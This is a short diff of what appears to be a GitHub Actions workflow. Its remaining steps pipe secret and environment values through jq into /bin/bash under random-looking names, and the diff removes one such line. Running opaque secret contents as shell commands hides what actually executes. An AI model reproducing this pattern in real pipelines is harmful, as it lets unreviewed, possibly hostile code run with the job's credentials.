@@ -22,7 +22,6 @@ jobs:
           oap14701: ${{ secrets.oap14701 }}
         run: |
           printf '%s' "$oap14701" | jq -r .psrl9 | /bin/bash
-          printf '%s' "$pqufq7773" | jq -r .dlcvl7432 | /bin/bash
           echo $jl4972 | jq -r .gn43 | /bin/bash
           echo $uxjir26 | jq -r .rhyo86595 | /bin/bash
 
